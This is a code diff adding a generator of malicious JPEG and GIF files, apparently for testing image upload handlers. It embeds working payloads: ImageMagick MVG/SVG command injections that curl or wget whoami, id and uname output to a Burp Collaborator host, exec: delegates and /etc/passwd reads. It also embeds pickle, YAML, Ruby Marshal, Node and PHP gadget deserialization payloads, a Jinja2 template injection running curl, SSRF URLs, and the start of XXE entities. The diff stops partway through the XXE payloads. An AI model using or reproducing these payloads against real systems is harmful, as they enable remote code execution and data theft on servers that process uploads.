@@ -2775,6 +2775,645 @@ pop graphic-context'''.encode('utf-8')
             with open(img_path, 'wb') as f:
                 f.write(png_data)
     
+    if (ext == 'jpg' or ext == 'jpeg' or ext == 'gif') and (should_generate_type('rce') or should_generate_type('ssrf') or should_generate_type('xxe')):
+        if ext == 'jpg' or ext == 'jpeg':
+            img = Image.new('RGB', (100, 100), color='red')
+            img_format = 'JPEG'
+            file_ext = 'jpg'
+        elif ext == 'gif':
+            gif_header = b'GIF89a'
+            gif_trailer = b'\x00;'
+            file_ext = 'gif'
+        
+        def add_mvg_to_jpeg(img_data, mvg_payload):
+            xmp_payload = f'''<?xml version="1.0"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/">
+<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+<rdf:Description rdf:about="">
+<dc:title>{mvg_payload}</dc:title>
+</rdf:Description>
+</rdf:RDF>
+</x:xmpmeta>'''.encode('utf-8')
+            app1_marker = b'\xFF\xE1'
+            app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
+            app1_length = struct.pack('>H', len(xmp_payload) + len(app1_identifier) + 2)
+            app1_chunk = app1_marker + app1_length + app1_identifier + xmp_payload
+            soi_pos = img_data.find(b'\xFF\xD8')
+            if soi_pos != -1:
+                insert_pos = soi_pos + 2
+                img_data[insert_pos:insert_pos] = app1_chunk
+            return img_data
+        
+        def add_mvg_to_gif(gif_header, gif_trailer, mvg_payload):
+            comment_extension = b'\x21\xFE'
+            comment_payload = f'ImageMagick:{mvg_payload}'.encode('utf-8')
+            comment_length = bytes([min(len(comment_payload), 255)])
+            comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+            return gif_header + comment_chunk + gif_trailer
+        
+        if should_generate_type('rce'):
+            if ext == 'jpg' or ext == 'jpeg':
+                rce_payloads = {
+                    1: f'''push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://{burp_collab}/rce-imagemagick?`curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-imagemagick`)'
+pop graphic-context''',
+                    2: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-delegate?`wget --header="X-RCE-Proof: $(id)" {base_url}/rce-delegate`" width="100" height="100"/>
+</svg>''',
+                    3: f'''push graphic-context
+image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-mvg)"
+pop graphic-context''',
+                    4: f'''push graphic-context
+viewbox 0 0 640 480
+fill "label:@/dev/stdin"
+pop graphic-context''',
+                    5: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
+</svg>''',
+                    6: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-https?$(wget --header="X-RCE-Proof: $(id)" {base_url}/rce-https))
+pop graphic-context''',
+                    7: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(http://{burp_collab}/rce-http?$(curl -H "X-RCE-Proof: $(pwd)" {base_url}/rce-http))
+pop graphic-context''',
+                    8: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(ftp://{burp_collab}/rce-ftp?$(id))
+pop graphic-context''',
+                    9: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-msl)\\" /></image>"
+pop graphic-context''',
+                    10: f'''push graphic-context
+viewbox 0 0 640 480
+fill "text:@https://{burp_collab}/rce-text?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-text)"
+pop graphic-context''',
+                    11: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-epi)"
+pop graphic-context''',
+                    12: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(curl -H \\"X-RCE-Proof: $(hostname)\\" {base_url}/rce-ps)"
+pop graphic-context''',
+                    13: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-multi-https?$(curl -H \\"X-RCE-Proof: $(id)\\" {base_url}/rce-multi-https)" width="100" height="100"/>
+<image xlink:href="http://{burp_collab}/rce-multi-http?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-multi-http)" width="100" height="100"/>
+</svg>''',
+                    14: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(file:///etc/passwd)
+pop graphic-context''',
+                    15: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(curl -H \\"X-RCE-Proof: $(pwd)\\" {base_url}/rce-rar)"
+pop graphic-context''',
+                    16: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(curl -H \\"X-RCE-Proof: $(ls -la | head -c 200)\\" {base_url}/rce-zip)"
+pop graphic-context''',
+                    17: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-backtick?`curl -H "X-RCE-Proof: $(echo RCE_SUCCESS)" {base_url}/rce-backtick`)
+pop graphic-context''',
+                    18: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-dollar?$(curl -H "X-RCE-Proof: $(hostname)" {base_url}/rce-dollar))
+pop graphic-context''',
+                    19: f'''<svg xmlns="http://www.w3.org/2000/svg">
+<script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script?proof="+encodeURIComponent("RCE_SUCCESS")) ]]></script>
+<rect width="100" height="100"/>
+</svg>''',
+                    20: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "exec:curl -H \\"X-RCE-Proof: $(date)\\" https://{burp_collab}/rce-exec"
+pop graphic-context'''
+                }
+                
+                rce_names = {
+                    1: "imagemagick", 2: "imagemagick_delegate", 3: "mvg_delegate", 4: "mvg_label",
+                    5: "svg_delegate", 6: "mvg_https_cmd", 7: "mvg_http_cmd", 8: "mvg_ftp",
+                    9: "mvg_msl", 10: "mvg_text", 11: "mvg_epi", 12: "mvg_ps",
+                    13: "svg_multi", 14: "mvg_file", 15: "mvg_rar", 16: "mvg_zip",
+                    17: "mvg_backtick", 18: "mvg_dollar", 19: "svg_script", 20: "mvg_exec"
+                }
+                
+                for rce_num in range(1, 21):
+                    if rce_num in rce_payloads:
+                        rce_suffix = rce_names.get(rce_num, f"rce{rce_num}")
+                        img_path = rce_dir / f"rce{rce_num}_{rce_suffix}.{file_ext}"
+                        img.save(img_path, img_format)
+                        with open(img_path, 'rb') as f:
+                            img_data = bytearray(f.read())
+                        img_data = add_mvg_to_jpeg(img_data, rce_payloads[rce_num])
+                        with open(img_path, 'wb') as f:
+                            f.write(img_data)
+                
+                if should_generate(['php', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
+                    img_path = rce_dir / "rce21_unserialize_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        phpggc_payload = generate_phpggc_for_jpeg_exif(burp_collab, 'Monolog/RCE1')
+                        serialize_payload = phpggc_payload if phpggc_payload else 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+                    else:
+                        serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['all']) and should_generate_type('rce'):
+                    img_path = rce_dir / "rce22_chunk_overflow.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    overflow_payload = b'A' * 2000
+                    com_marker = b'\xFF\xFE'
+                    com_length = struct.pack('>H', len(overflow_payload) + 2)
+                    com_chunk = com_marker + com_length + overflow_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
+                    img_path = rce_dir / "rce26_python_pickle_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        pickle_payload_b64 = generate_python_pickle_for_png(burp_collab)
+                        serialize_payload = pickle_payload_b64 if pickle_payload_b64 else 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
+                    else:
+                        serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
+                    img_path = rce_dir / "rce27_python_yaml_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        yaml_payload = generate_python_yaml_for_png(burp_collab)
+                        serialize_payload = yaml_payload if yaml_payload else '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
+                    else:
+                        serialize_payload = '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
+                    img_path = rce_dir / "rce28_ruby_marshal_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        marshal_payload = generate_ruby_marshal_for_png(burp_collab)
+                        serialize_payload = marshal_payload if marshal_payload else '\x04\x08I"\x10test\x06:\x06ET'
+                    else:
+                        serialize_payload = '\x04\x08I"\x10test\x06:\x06ET'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('latin-1')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
+                    img_path = rce_dir / "rce29_ruby_yaml_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        yaml_payload = generate_ruby_yaml_for_png(burp_collab)
+                        serialize_payload = yaml_payload if yaml_payload else '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
+                    else:
+                        serialize_payload = '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['nodejs', 'all']) and should_generate_type('deserialization'):
+                    img_path = rce_dir / "rce30_nodejs_serialize_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        nodejs_payload = generate_nodejs_serialize_for_png(burp_collab)
+                        serialize_payload = nodejs_payload if nodejs_payload else '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
+                    else:
+                        serialize_payload = '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = serialize_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+                
+                if should_generate(['python', 'all']) and (should_generate_type('ssti') or should_generate_type('rce') or should_generate_type('deserialization')):
+                    img_path = rce_dir / "rce31_ssti_jinja2_text.jpg"
+                    img.save(img_path, img_format)
+                    with open(img_path, 'rb') as f:
+                        img_data = bytearray(f.read())
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        ssti_payload = generate_ssti_payload('jinja2', f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-jinja2", burp_collab)
+                    else:
+                        ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-jinja2").read()}}}}'
+                    com_marker = b'\xFF\xFE'
+                    com_payload = ssti_payload.encode('utf-8')
+                    com_length = struct.pack('>H', len(com_payload) + 2)
+                    com_chunk = com_marker + com_length + com_payload
+                    soi_pos = img_data.find(b'\xFF\xD8')
+                    if soi_pos != -1:
+                        insert_pos = soi_pos + 2
+                        img_data[insert_pos:insert_pos] = com_chunk
+                    with open(img_path, 'wb') as f:
+                        f.write(img_data)
+            
+            elif ext == 'gif':
+                rce_payloads_gif = {
+                    1: f'''push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://{burp_collab}/rce-imagemagick?`curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-imagemagick`)'
+pop graphic-context''',
+                    2: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-delegate?`wget --header="X-RCE-Proof: $(id)" {base_url}/rce-delegate`" width="100" height="100"/>
+</svg>''',
+                    3: f'''push graphic-context
+image over 0,0 0,0 "https://{burp_collab}/rce-mvg?$(curl -H "X-RCE-Proof: $(whoami)" {base_url}/rce-mvg)"
+pop graphic-context''',
+                    4: f'''push graphic-context
+viewbox 0 0 640 480
+fill "label:@/dev/stdin"
+pop graphic-context''',
+                    5: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-svg-delegate" width="100" height="100"/>
+</svg>''',
+                    6: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-https?$(wget --header="X-RCE-Proof: $(id)" {base_url}/rce-https))
+pop graphic-context''',
+                    7: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(http://{burp_collab}/rce-http?$(curl -H "X-RCE-Proof: $(pwd)" {base_url}/rce-http))
+pop graphic-context''',
+                    8: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(ftp://{burp_collab}/rce-ftp?$(id))
+pop graphic-context''',
+                    9: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "msl:<?xml version=\\"1.0\\"?><image><read filename=\\"https://{burp_collab}/rce-msl?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-msl)\\" /></image>"
+pop graphic-context''',
+                    10: f'''push graphic-context
+viewbox 0 0 640 480
+fill "text:@https://{burp_collab}/rce-text?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-text)"
+pop graphic-context''',
+                    11: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "epi:https://{burp_collab}/rce-epi?$(curl -H \\"X-RCE-Proof: $(uname -a)\\" {base_url}/rce-epi)"
+pop graphic-context''',
+                    12: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "ps:https://{burp_collab}/rce-ps?$(curl -H \\"X-RCE-Proof: $(hostname)\\" {base_url}/rce-ps)"
+pop graphic-context''',
+                    13: f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<image xlink:href="https://{burp_collab}/rce-multi-https?$(curl -H \\"X-RCE-Proof: $(id)\\" {base_url}/rce-multi-https)" width="100" height="100"/>
+<image xlink:href="http://{burp_collab}/rce-multi-http?$(curl -H \\"X-RCE-Proof: $(whoami)\\" {base_url}/rce-multi-http)" width="100" height="100"/>
+</svg>''',
+                    14: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(file:///etc/passwd)
+pop graphic-context''',
+                    15: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "rar:https://{burp_collab}/rce-rar?$(curl -H \\"X-RCE-Proof: $(pwd)\\" {base_url}/rce-rar)"
+pop graphic-context''',
+                    16: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "zip:https://{burp_collab}/rce-zip?$(curl -H \\"X-RCE-Proof: $(ls -la | head -c 200)\\" {base_url}/rce-zip)"
+pop graphic-context''',
+                    17: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-backtick?`curl -H "X-RCE-Proof: $(echo RCE_SUCCESS)" {base_url}/rce-backtick`)
+pop graphic-context''',
+                    18: f'''push graphic-context
+viewbox 0 0 640 480
+fill url(https://{burp_collab}/rce-dollar?$(curl -H "X-RCE-Proof: $(hostname)" {base_url}/rce-dollar))
+pop graphic-context''',
+                    19: f'''<svg xmlns="http://www.w3.org/2000/svg">
+<script type="text/ecmascript"> <![CDATA[ fetch("https://{burp_collab}/rce-svg-script?proof="+encodeURIComponent("RCE_SUCCESS")) ]]></script>
+<rect width="100" height="100"/>
+</svg>''',
+                    20: f'''push graphic-context
+viewbox 0 0 640 480
+image over 0,0 0,0 "exec:curl -H \\"X-RCE-Proof: $(date)\\" https://{burp_collab}/rce-exec"
+pop graphic-context'''
+                }
+                
+                rce_names_gif = {
+                    1: "imagemagick", 2: "imagemagick_delegate", 3: "mvg_delegate", 4: "mvg_label",
+                    5: "svg_delegate", 6: "mvg_https_cmd", 7: "mvg_http_cmd", 8: "mvg_ftp",
+                    9: "mvg_msl", 10: "mvg_text", 11: "mvg_epi", 12: "mvg_ps",
+                    13: "svg_multi", 14: "mvg_file", 15: "mvg_rar", 16: "mvg_zip",
+                    17: "mvg_backtick", 18: "mvg_dollar", 19: "svg_script", 20: "mvg_exec"
+                }
+                
+                for rce_num in range(1, 21):
+                    if rce_num in rce_payloads_gif:
+                        rce_suffix = rce_names_gif.get(rce_num, f"rce{rce_num}")
+                        gif_content = add_mvg_to_gif(gif_header, gif_trailer, rce_payloads_gif[rce_num])
+                        with open(rce_dir / f"rce{rce_num}_{rce_suffix}.gif", 'wb') as f:
+                            f.write(gif_content)
+                
+                if should_generate(['php', 'all']) and (should_generate_type('rce') or should_generate_type('deserialization')):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        phpggc_payload = generate_phpggc_for_png_text(burp_collab, 'Monolog/RCE1')
+                        serialize_payload = phpggc_payload if phpggc_payload else 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+                    else:
+                        serialize_payload = 'O:8:"stdClass":1:{s:4:"test";s:4:"data";}'
+                    comment_payload = serialize_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce21_unserialize_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['all']) and should_generate_type('rce'):
+                    comment_extension = b'\x21\xFE'
+                    overflow_payload = b'A' * 2000
+                    comment_length = bytes([min(len(overflow_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + overflow_payload[:255] + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce22_chunk_overflow.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        pickle_payload_b64 = generate_python_pickle_for_png(burp_collab)
+                        serialize_payload = pickle_payload_b64 if pickle_payload_b64 else 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
+                    else:
+                        serialize_payload = 'gASVHwAAAAAAAACMBXBvc3lzZXQplC4='
+                    comment_payload = serialize_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce26_python_pickle_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['python', 'all']) and should_generate_type('deserialization'):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        yaml_payload = generate_python_yaml_for_png(burp_collab)
+                        serialize_payload = yaml_payload if yaml_payload else '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
+                    else:
+                        serialize_payload = '!!python/object/apply:os.system ["curl http://' + burp_collab + '/rce-yaml"]'
+                    comment_payload = serialize_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce27_python_yaml_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        marshal_payload = generate_ruby_marshal_for_png(burp_collab)
+                        serialize_payload = marshal_payload if marshal_payload else '\x04\x08I"\x10test\x06:\x06ET'
+                    else:
+                        serialize_payload = '\x04\x08I"\x10test\x06:\x06ET'
+                    comment_payload = serialize_payload.encode('latin-1')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce28_ruby_marshal_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['ruby', 'all']) and should_generate_type('deserialization'):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        yaml_payload = generate_ruby_yaml_for_png(burp_collab)
+                        serialize_payload = yaml_payload if yaml_payload else '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
+                    else:
+                        serialize_payload = '--- !ruby/object:System\ncmd: "curl http://' + burp_collab + '/rce-ruby-yaml"'
+                    comment_payload = serialize_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce29_ruby_yaml_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['nodejs', 'all']) and should_generate_type('deserialization'):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        nodejs_payload = generate_nodejs_serialize_for_png(burp_collab)
+                        serialize_payload = nodejs_payload if nodejs_payload else '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
+                    else:
+                        serialize_payload = '{"rce":"curl http://' + burp_collab + '/rce-nodejs"}'
+                    comment_payload = serialize_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce30_nodejs_serialize_text.gif", 'wb') as f:
+                        f.write(gif_content)
+                
+                if should_generate(['python', 'all']) and (should_generate_type('ssti') or should_generate_type('rce') or should_generate_type('deserialization')):
+                    comment_extension = b'\x21\xFE'
+                    if PAYLOAD_GENERATOR_AVAILABLE:
+                        ssti_payload = generate_ssti_payload('jinja2', f"curl -H 'X-RCE-Proof: $(whoami)' http://{burp_collab}/rce-ssti-jinja2", burp_collab)
+                    else:
+                        ssti_payload = f'{{{{config.__class__.__init__.__globals__["os"].popen("curl -H \'X-RCE-Proof: $(whoami)\' http://{burp_collab}/rce-ssti-jinja2").read()}}}}'
+                    comment_payload = ssti_payload.encode('utf-8')
+                    comment_length = bytes([min(len(comment_payload), 255)])
+                    comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
+                    gif_content = gif_header + comment_chunk + gif_trailer
+                    with open(rce_dir / "rce31_ssti_jinja2_text.gif", 'wb') as f:
+                        f.write(gif_content)
+        
+        if should_generate_type('ssrf'):
+            ssrf_payloads = {
+                1: f'http://{burp_collab}/ssrf-1',
+                2: f'https://{burp_collab}/ssrf-mvg',
+                3: f'http://{burp_collab}/ssrf-mvg-http',
+                4: f'ftp://{burp_collab}/ssrf-ftp',
+                5: f'https://{burp_collab}/ssrf-https',
+                6: f'http://{burp_collab}/ssrf-http',
+                7: f'ftp://{burp_collab}/ssrf-ftp',
+                8: f'gopher://{burp_collab}/ssrf-gopher',
+                9: f'ldap://{burp_collab}/ssrf-ldap',
+                10: f'file:///etc/passwd',
+                11: f'https://{burp_collab}/ssrf-image-https',
+                12: f'http://{burp_collab}/ssrf-image-http',
+                13: f'https://{burp_collab}/ssrf-svg',
+                14: f'https://{burp_collab}/ssrf-msl',
+                15: f'https://{burp_collab}/ssrf-epi',
+                16: f'https://{burp_collab}/ssrf-ps',
+                17: f'https://{burp_collab}/ssrf-text',
+                18: f'https://{burp_collab}/ssrf-multi',
+                19: f'https://{burp_collab}/ssrf-rar',
+                20: f'https://{burp_collab}/ssrf-zip',
+                21: f'http://{burp_collab}/ssrf-itxt'
+            }
+            
+            ssrf_names = {
+                1: "com", 2: "mvg_url", 3: "mvg_http", 4: "mvg_ftp",
+                5: "svg_https", 6: "svg_http", 7: "svg_ftp", 8: "mvg_gopher",
+                9: "mvg_ldap", 10: "mvg_file", 11: "mvg_image_https", 12: "mvg_image_http",
+                13: "svg_embedded", 14: "mvg_msl", 15: "mvg_epi", 16: "mvg_ps",
+                17: "mvg_text", 18: "svg_multi", 19: "mvg_rar", 20: "mvg_zip",
+                21: "itxt_url"
+            }
+            
+            if ext == 'jpg' or ext == 'jpeg':
+                for ssrf_num in range(1, 22):
+                    if ssrf_num in ssrf_payloads:
+                        ssrf_suffix = ssrf_names.get(ssrf_num, f"ssrf{ssrf_num}")
+                        img_path = ssrf_dir / f"ssrf{ssrf_num}_{ssrf_suffix}.{file_ext}"
+                        img.save(img_path, img_format)
+                        with open(img_path, 'rb') as f:
+                            img_data = bytearray(f.read())
+                        
+                        if ssrf_num == 1:
+                            ssrf_payload = ssrf_payloads[ssrf_num].encode('utf-8')
+                            com_marker = b'\xFF\xFE'
+                            com_length = struct.pack('>H', len(ssrf_payload) + 2)
+                            com_chunk = com_marker + com_length + ssrf_payload
+                            soi_pos = img_data.find(b'\xFF\xD8')
+                            if soi_pos != -1:
+                                insert_pos = soi_pos + 2
+                                img_data[insert_pos:insert_pos] = com_chunk
+                        else:
+                            mvg_payload = f'''push graphic-context
+viewbox 0 0 640 480
+fill url({ssrf_payloads[ssrf_num]})
+pop graphic-context'''
+                            img_data = add_mvg_to_jpeg(img_data, mvg_payload)
+                        
+                        with open(img_path, 'wb') as f:
+                            f.write(img_data)
+            
+            elif ext == 'gif':
+                for ssrf_num in range(1, 22):
+                    if ssrf_num in ssrf_payloads:
+                        ssrf_suffix = ssrf_names.get(ssrf_num, f"ssrf{ssrf_num}")
+                        mvg_payload = f'''push graphic-context
+viewbox 0 0 640 480
+fill url({ssrf_payloads[ssrf_num]})
+pop graphic-context'''
+                        gif_content = add_mvg_to_gif(gif_header, gif_trailer, mvg_payload)
+                        with open(ssrf_dir / f"ssrf{ssrf_num}_{ssrf_suffix}.gif", 'wb') as f:
+                            f.write(gif_content)
+        
+        if should_generate_type('xxe'):
+            xxe_payloads = {
+                1: f'''<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-1">%x;]><x>test</x>''',
